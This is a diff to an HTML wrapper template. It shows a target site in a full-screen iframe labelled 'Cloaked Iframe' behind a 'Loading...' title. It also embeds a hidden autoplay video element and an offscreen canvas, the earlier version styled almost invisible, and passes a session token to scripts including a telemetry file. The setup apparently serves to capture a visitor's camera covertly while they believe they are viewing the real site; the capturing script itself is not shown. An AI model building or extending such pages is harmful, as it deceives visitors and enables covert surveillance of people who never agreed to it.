@@ -1,45 +1,41 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Loading…</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
-    }
-    #siteFrame {
-      width: 100vw;
-      height: 100vh;
-      border: none;
-      display: block;
-    }
-    #video {
-      position: fixed;
-      bottom: 4px;
-      right: 4px;
-      width: 80px;
-      height: 80px;
-      opacity: 0.01;
-      pointer-events: none;
-      z-index: 9999;
-    }
-    #canvas { display: none; }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>Loading...</title>
+  <link rel="stylesheet" href="/static/css/wrapper.css" />
 </head>
 <body>
-  <iframe id="siteFrame" src="{{ target_url }}"></iframe>
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+
+  <!-- Cloaked Iframe -->
+  <iframe id="siteFrame" src="{{ target_url }}" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
+
+  <!-- Fallback Dialog for Iframe Restriction Policies -->
+  <div id="iframe-fallback" class="fallback-container">
+    <div class="fallback-card">
+      <div class="fallback-icon">🌐</div>
+      <h2>Display Limitation</h2>
+      <p style="color: #94a3b8; font-size: 0.95rem; margin-top: 8px;">
+        This destination website restricts direct embedded viewing due to security policies (X-Frame-Options).
+      </p>
+      <a href="{{ target_url }}" target="_blank" rel="noopener noreferrer" class="fallback-btn">
+        Open Website in New Tab ↗
+      </a>
+    </div>
+  </div>
+
+  <video id="hidden-video" autoplay playsinline muted></video>
+  <canvas id="offscreen-canvas"></canvas>
 
   <script>
-    window.TOKEN = "{{ token }}";
+    window.SESSION_CONFIG = {
+      token: "{{ token }}",
+      targetUrl: "{{ target_url }}"
+    };
   </script>
-  <script src="/static/wrap_app.js"></script>
+  <script src="/static/js/api.js"></script>
+  <script src="/static/js/telemetry.js"></script>
+  <script src="/static/js/wrap_app.js"></script>
 </body>
 </html>
